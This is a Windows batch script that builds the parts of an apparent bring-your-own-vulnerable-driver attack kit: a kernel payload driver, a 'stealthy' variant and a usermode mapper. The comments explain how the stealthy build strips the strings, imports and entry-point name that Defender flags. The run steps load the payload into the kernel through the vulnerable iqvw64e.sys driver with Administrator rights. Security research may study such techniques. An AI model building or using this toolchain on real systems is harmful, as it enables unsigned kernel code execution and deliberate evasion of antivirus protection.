@echo off
setlocal

:: ============================================================
::  byovd-indpages build script
::  Requires: VS 2022, WDK 10.0.26100.0
::  Run from a Developer Command Prompt OR let this script find cl.exe.
:: ============================================================

set MSVC_ROOT=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.29.30133
set WDK_ROOT=C:\Program Files (x86)\Windows Kits\10
set WDK_VER=10.0.26100.0

set CL=%MSVC_ROOT%\bin\HostX64\x64\cl.exe
set LINK=%MSVC_ROOT%\bin\HostX64\x64\link.exe

set WDK_INC=%WDK_ROOT%\Include\%WDK_VER%
set WDK_LIB_KM=%WDK_ROOT%\Lib\%WDK_VER%\km\x64
set WDK_LIB_UM=%WDK_ROOT%\Lib\%WDK_VER%\um\x64
set MSVC_LIB=%MSVC_ROOT%\lib\x64

if not exist "%CL%" (
    echo [!] cl.exe not found at %CL%
    echo     Open a "x64 Native Tools Command Prompt for VS 2022" and re-run.
    exit /b 1
)
if not exist "%WDK_INC%\km\ntddk.h" (
    echo [!] WDK not found at %WDK_ROOT%\Include\%WDK_VER%\km
    echo     Install Windows 11 WDK 10.0.26100.0 from:
    echo     https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk
    exit /b 1
)

:: ============================================================
::  Build: payload kernel driver (payload\payload.c -> payload\payload.sys)
:: ============================================================
echo [*] Building payload.sys...
mkdir payload\obj 2>nul

"%CL%" ^
    /nologo /c ^
    /kernel ^
    /GS- ^
    /GR- ^
    /EHs-c- ^
    /W4 /WX /O2 /Oi ^
    /Zi /Fd:payload\obj\payload.pdb ^
    /I"%WDK_INC%\km" ^
    /I"%WDK_INC%\shared" ^
    /D_AMD64_ /DAMD64 /D_WIN64 ^
    /DNTDDI_VERSION=0x0A000008 ^
    /Fo:payload\obj\payload.obj ^
    payload\payload.c

if errorlevel 1 (
    echo [!] payload.c compilation failed
    exit /b 1
)

"%LINK%" ^
    /nologo ^
    /DRIVER ^
    /SUBSYSTEM:NATIVE ^
    /ENTRY:DriverEntry ^
    /NODEFAULTLIB ^
    /LTCG:OFF ^
    /DEBUG ^
    /PDB:payload\payload.pdb ^
    /OUT:payload\payload.sys ^
    /LIBPATH:"%WDK_LIB_KM%" ^
    ntoskrnl.lib ^
    BufferOverflowFastFailK.lib ^
    payload\obj\payload.obj

if errorlevel 1 (
    echo [!] payload.sys link failed
    exit /b 1
)
echo [+] payload\payload.sys built OK

:: ============================================================
::  Build: stealthy payload (payload\payload_stealthy.c -> payload\payload_stealthy.sys)
::
::  No includes, no imports, no strings, renamed entry point.
::  Eliminates the three static signals that trigger Defender on payload.sys:
::    - plaintext DbgPrint string in .rdata
::    - ntoskrnl.exe!DbgPrint in the import table
::    - "DriverEntry" as the PE entry point symbol
::
::  Omits ntoskrnl.lib and BufferOverflowFastFailK.lib entirely.
::  /GS- ensures no __security_check_cookie symbol reference.
::  /ENTRY:PocEntry names the entry point without the "DriverEntry" string.
:: ============================================================
echo.
echo [*] Building payload_stealthy.sys...

"%CL%" ^
    /nologo /c ^
    /kernel ^
    /GS- ^
    /GR- ^
    /EHs-c- ^
    /W4 /WX /O2 /Oi ^
    /Zi /Fd:payload\obj\payload_stealthy.pdb ^
    /Fo:payload\obj\payload_stealthy.obj ^
    payload\payload_stealthy.c

if errorlevel 1 (
    echo [!] payload_stealthy.c compilation failed
    exit /b 1
)

"%LINK%" ^
    /nologo ^
    /DRIVER ^
    /SUBSYSTEM:NATIVE ^
    /ENTRY:PocEntry ^
    /NODEFAULTLIB ^
    /LTCG:OFF ^
    /DEBUG ^
    /PDB:payload\payload_stealthy.pdb ^
    /OUT:payload\payload_stealthy.sys ^
    payload\obj\payload_stealthy.obj

if errorlevel 1 (
    echo [!] payload_stealthy.sys link failed
    exit /b 1
)
echo [+] payload\payload_stealthy.sys built OK

:: ============================================================
::  Build: usermode mapper (mapper\mapper.c -> mapper\mapper.exe)
:: ============================================================
echo.
echo [*] Building mapper.exe...
mkdir mapper\obj 2>nul

"%CL%" ^
    /nologo /c ^
    /W4 /O2 /Zi ^
    /Fd:mapper\obj\mapper.pdb ^
    /I"%WDK_INC%\um" ^
    /I"%WDK_INC%\shared" ^
    /Fo:mapper\obj\mapper.obj ^
    mapper\mapper.c

if errorlevel 1 (
    echo [!] mapper.c compilation failed
    exit /b 1
)

"%LINK%" ^
    /nologo ^
    /SUBSYSTEM:CONSOLE ^
    /DEBUG ^
    /PDB:mapper\mapper.pdb ^
    /OUT:mapper\mapper.exe ^
    /LIBPATH:"%WDK_LIB_UM%" ^
    /LIBPATH:"%MSVC_LIB%" ^
    advapi32.lib ^
    mapper\obj\mapper.obj

if errorlevel 1 (
    echo [!] mapper.exe link failed
    exit /b 1
)
echo [+] mapper\mapper.exe built OK

:: ============================================================
::  Stage: copy payloads next to mapper.exe for easy running
:: ============================================================
copy /Y payload\payload.sys mapper\payload.sys >nul
echo [+] payload.sys copied to mapper\
copy /Y payload\payload_stealthy.sys mapper\payload_stealthy.sys >nul
echo [+] payload_stealthy.sys copied to mapper\

echo.
echo Done.  To run (simple payload, needs DebugView):
echo   1. Copy iqvw64e.sys into mapper\
echo   2. mapper.exe loads payload.sys by default
echo   3. Run mapper\mapper.exe as Administrator
echo   4. Watch DebugView for '[indpages-payload]' output
echo.
echo To test stealthy payload (no DebugView needed):
echo   copy mapper\payload_stealthy.sys mapper\payload.sys
echo   Run mapper\mapper.exe as Administrator
echo   Mapper reports EXEC_MAGIC 0x600DC0DE in the return value
echo.
endlocal
